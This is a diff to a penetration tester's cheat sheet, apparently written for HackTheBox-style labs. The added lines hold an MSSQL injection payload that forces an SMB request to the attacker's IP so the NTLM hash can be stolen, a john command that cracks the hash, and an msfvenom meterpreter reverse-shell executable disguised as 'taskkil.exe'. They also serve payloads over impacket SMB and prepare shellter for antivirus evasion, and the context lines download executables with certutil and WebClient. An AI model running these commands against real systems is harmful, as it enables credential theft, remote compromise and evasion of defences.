@@ -3,6 +3,13 @@
 WEB
 davtest
 droopescan --> https://github.com/droope/droopescan
+http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/
+# make smb request to steal hash +++ listen with responder -I tun0
+27;declare @q varchar(200);set @q='\\10.10.14.7\foo'; exec master.dbo.xp_dirtree @q; --
+john stacy.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+
 ENUMERATION
 gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
@@ -52,6 +59,7 @@ certutil -urlcache -split -f http://10.10.14.12/priv.exe C:\\users\\public\\agen
 Start-BitsTransfer -Source http://10.10.14.12/priv.exe -Destination 1.exe # PS
 $client = New-Object System.Net.WebClient  # two steps is better
 $client.DownloadFile('http://10.10.14.12/priv.exe', '1.exe')
+xcopy \\10.10.14.7\files\taskkill.exe  # from smb file server created with impacket
 
 PRIVESC WINDOWS 
 whoami /priv
@@ -72,6 +80,8 @@ LINUX
 USEFULL COMMANDS.ps1
 tcpdump -i tun0 icmp
 python -m SimpleHTTPServer 80
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=51251 -f exe -o taskkil.exe
+impacket-smbserver files `pwd`
 
 
 USEFULL FRAMEWORKS
@@ -83,8 +93,10 @@ webshells --> https://github.com/BlackArch/webshells.git
 sherlock --> https://github.com/rasta-mouse/Sherlock
 empire --> https://github.com/EmpireProject/Empire.git
 unicorn --> https://github.com/trustedsec/unicorn.git
+
 APT
 gobuster
 mdbtools
 seclists
+shellter + dpkg --add-architecture i386 && apt-get update && apt-get install wine32
 
